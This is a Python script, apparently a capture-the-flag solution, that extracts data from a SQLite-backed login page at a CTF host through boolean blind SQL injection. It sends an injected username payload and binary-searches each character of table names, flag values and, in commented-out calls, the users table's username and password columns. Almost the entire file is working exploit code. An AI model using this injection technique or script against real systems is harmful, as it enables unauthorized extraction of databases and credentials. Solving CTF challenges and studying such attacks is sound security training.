import requests

URL = 'http://ctf.adl.tw:12004/login.php'
username = "a' OR 2=2 AND " \
    + "(SELECT UNICODE(SUBSTR({}, {:d}, 1)) FROM {} LIMIT {:d}, 1) > {:d} -- "
password = "b"


# return Trun if logged in, False otherwise
def test(table, column, line, position, ascii_) -> bool:
    data = {
        'ctf_username': username.format(column, position, table, line, ascii_),
        'ctf_password': password}
    r = requests.post(URL, data=data, verify=False, timeout=3)

    if 'Flag 2' in r.text:
        return True
    else:
        return False

# search for this character, return -1 if not found
def binary_search_char(table, column, line, position) -> int:
    # trivial testcase: every unicode should > 0
    if not test(table, column, line, position, ascii_=0):
        return -1

    left = 1
    right = 255

    while left + 1 < right:
        mid = (left + right) // 2
        if test(table, column, line, position, ascii_=mid):
            left = mid
        else:
            right = mid

    if test(table, column, line, position, ascii_=left):
        return right
    else:
        return right + 1  # since right + 1 > right

def main(table, column):
    # try out each line
    line = 0
    while True:
        # try out each substr position
        position = 1
        while True:
            ch = binary_search_char(table, column, line, position)
            if ch < 0:
                print('')
                break
            else:
                print(chr(ch), end='', flush=True)
    
            position += 1

        line += 1
        if binary_search_char(table, column, line, position=1) < 0:
            break


if __name__ == '__main__':
    tables = [
        'sqlite_sequence',
        'users',
        'users_usernamer_uindex',
        'flag1',
        'flag2',
        'flag3',
        'flag4',
        'flag5',
        'flag6',
        'flag7',
        'flag8',
        'flag9',
        'flag10']

    # for tb in tables:
    #     print('=====', tb, '=====')
    #     main(table=f"pragma_table_info('{tb}')", column='name')

    # main(table='users', column='id')
    # main(table='users', column='username')
    # main(table='users', column='password')
    # main(table='users', column='name')

    for tb in tables:
        if 'flag' in tb:
            main(table=tb, column='flag')


# [Buggy version]
# # try out each line
# line = 0
# while True:
#     # try out each substr position
#     position = 1
#     while True:
#         ch = binary_search_char(table, column, line, position)
#         if ch < 0:
#             print('')
#             break
#         else:
#             print(chr(ch), end='', flush=True)
#
#         position += 1
#
#     line += 1
#     if binary_search_char(table, column, line, position) < 0:
#         break
#
# print('Done.')